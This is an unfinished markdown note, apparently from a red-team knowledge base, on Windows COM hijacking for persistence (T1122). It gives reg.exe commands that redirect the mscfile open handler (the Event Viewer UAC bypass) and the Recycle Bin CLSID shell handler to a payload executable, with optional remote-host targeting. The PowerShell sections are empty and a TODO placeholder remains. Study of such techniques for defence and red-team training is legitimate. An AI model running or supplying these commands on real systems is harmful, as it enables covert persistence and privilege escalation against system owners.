---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1122
  - windows
---
# COM Hijacking

TODO: Fill this info

## Event Viewer

### Command Prompt

```
C:\> reg.exe add "HKLM\SOFTWARE\Classes\mscfile\shell\open\command" /f

C:\> reg.exe add "HKLM\SOFTWARE\Classes\mscfile\shell\open\command" /t REG_SZ /d "C:\path\to\shell.exe" /f
```

### PowerShell

```

```

## Recycle Bin

### Command Prompt

```
C:\> reg.exe add [\\<IP>\]HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\ /ve /t REG_SZ /d "C:\path\to\payload.exe" /f

C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Classes\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\ /ve /t REG_SZ /d "C:\path\to\payload.exe" /f
```

### PowerShell

```

```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Local Privilege Escalation/Bypass User Access Control/Types of Bypassing UAC/MMC/Manual]]

### Persistence Info

- [Persistence Info: Recycle Bin COM Extension Handler](https://persistence-info.github.io/Data/recyclebin.html)

### Red Team Notes

- [Red Team Notes: COM Hijacking](https://www.ired.team/offensive-security/persistence/t1122-com-hijacking)